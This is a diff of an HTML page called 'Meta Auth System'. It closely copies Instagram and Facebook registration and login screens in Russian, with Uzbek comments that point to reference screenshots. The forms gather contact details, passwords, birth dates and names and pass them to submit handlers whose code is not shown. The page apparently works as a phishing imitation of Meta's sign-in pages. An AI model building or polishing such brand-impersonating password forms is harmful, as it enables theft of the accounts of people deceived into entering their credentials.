@@ -3,97 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registration System</title>
+    <title>Meta Auth System</title>
     <link rel="stylesheet" href="index.css">
 </head>
-<body>
+<body class="dark-bg">
 
-    <!-- 1. INSTAGRAM RO'YXATDAN O'TISH (1-rasm) -->
-    <div id="insta-reg" class="container dark-theme">
-        <div class="meta-logo">Meta</div>
-        <h2>Зарегистрируйтесь в Instagram</h2>
-        <p class="subtitle">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
+    <!-- 1. INSTAGRAM REGISTRATION (1-4 rasmlar) -->
+    <div id="insta-reg" class="card insta-card">
+        <div class="meta-header">Meta</div>
+        <h2 class="title">Зарегистрируйтесь в Instagram</h2>
+        <p class="desc">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
         
-        <form onsubmit="redirectToInsta(event)">
-            <div class="input-group">
+        <form onsubmit="handleInstaSubmit(event)">
+            <div class="input-field">
                 <label>Мобильный телефон или электронный адрес</label>
-                <input type="text" id="insta-contact" required>
+                <input type="text" id="insta-login" required>
             </div>
-            <div class="input-group">
+            <div class="input-field">
                 <label>Пароль</label>
                 <input type="password" id="insta-pass" required>
             </div>
             
-            <div class="date-row">
-                <label>Дата рождения</label>
-                <div class="select-wrapper">
+            <div class="dob-section">
+                <label>Дата рождения <span>?</span></label>
+                <div class="dob-selectors">
                     <select id="insta-day"></select>
                     <select id="insta-month"></select>
                     <select id="insta-year"></select>
                 </div>
             </div>
 
-            <div class="input-group">
+            <div class="input-field">
                 <label>Название (Имя и фамилия)</label>
                 <input type="text" id="insta-name" required>
             </div>
-            <div class="input-group">
+            <div class="input-field">
                 <label>Имя пользователя</label>
-                <input type="text" id="insta-username" required>
+                <input type="text" id="insta-user" required>
             </div>
 
-            <button type="submit" class="blue-btn">Отправить</button>
-            <button type="button" class="outline-btn" onclick="showPage('fb-login')">Войти через Facebook</button>
+            <button type="submit" class="btn-primary">Отправить</button>
+            <button type="button" class="btn-outline" onclick="togglePage('fb-login')">Войти через Facebook</button>
         </form>
     </div>
 
     <!-- 2. FACEBOOK LOGIN (5-rasm) -->
-    <div id="fb-login" class="container light-theme" style="display:none;">
-        <h2 class="fb-blue-text">Войдите на Facebook</h2>
+    <div id="fb-login" class="card fb-card" style="display:none;">
+        <h2 class="fb-logo-text">Войдите на Facebook</h2>
         <form>
-            <input type="text" placeholder="Электронный адрес или номер телефона" class="fb-input">
+            <input type="text" placeholder="Электронный адрес или номер мобильного телефона" class="fb-input">
             <input type="password" placeholder="Пароль" class="fb-input">
-            <button type="button" class="fb-blue-btn">Войти</button>
+            <button type="button" class="fb-btn-blue">Войти</button>
             <a href="#" class="fb-link">Забыли пароль?</a>
-            <div class="divider"></div>
-            <button type="button" class="fb-green-btn" onclick="showPage('fb-reg')">Создать новый аккаунт</button>
+            <div class="fb-divider"></div>
+            <button type="button" class="fb-btn-green" onclick="togglePage('fb-reg')">Создать новый аккаунт</button>
         </form>
-        <div class="meta-footer">Meta</div>
+        <div class="fb-footer-meta">Meta</div>
     </div>
 
     <!-- 3. FACEBOOK REGISTRATION (6-rasm) -->
-    <div id="fb-reg" class="container light-theme" style="display:none;">
-        <h2>Начните пользоваться Facebook</h2>
-        <p>Создайте аккаунт для общения с друзьями...</p>
+    <div id="fb-reg" class="card fb-card" style="display:none;">
+        <h2 class="fb-reg-title">Начните пользоваться Facebook</h2>
+        <p class="fb-reg-desc">Создайте аккаунт для общения с друзьями, родными...</p>
         
-        <form onsubmit="redirectToFB(event)">
-            <div class="input-row">
-                <input type="text" placeholder="Имя" id="fb-fname" required>
-                <input type="text" placeholder="Фамилия" id="fb-lname" required>
+        <form onsubmit="handleFBSubmit(event)">
+            <div class="fb-row">
+                <input type="text" placeholder="Имя" required>
+                <input type="text" placeholder="Фамилия" required>
             </div>
             
-            <div class="date-row">
-                <label>Дата рождения</label>
-                <div class="select-wrapper">
+            <div class="dob-section fb-light">
+                <label>Дата рождения <span>?</span></label>
+                <div class="dob-selectors">
                     <select id="fb-day"></select>
                     <select id="fb-month"></select>
                     <select id="fb-year"></select>
                 </div>
             </div>
 
-            <div class="input-group">
-                <select id="fb-gender">
-                    <option>Выберите пол</option>
+            <div class="input-field fb-light">
+                <label>Пол <span>?</span></label>
+                <select required>
+                    <option value="">Выберите пол</option>
                     <option>Мужской</option>
                     <option>Женский</option>
                 </select>
             </div>
 
-            <input type="text" placeholder="Номер или эл. адрес" class="fb-input" id="fb-contact">
-            <input type="password" placeholder="Пароль" class="fb-input" id="fb-pass">
+            <input type="text" placeholder="Номер мобильного телефона или адрес эл. почты" class="fb-input" required>
+            <input type="password" placeholder="Пароль" class="fb-input" required>
 
-            <button type="submit" class="fb-blue-btn">Отправить</button>
-            <button type="button" class="outline-btn" onclick="showPage('insta-reg')">У меня уже есть аккаунт</button>
+            <button type="submit" class="fb-btn-blue">Отправить</button>
+            <button type="button" class="btn-outline-dark" onclick="togglePage('insta-reg')">У меня уже есть аккаунт</button>
         </form>
     </div>
 
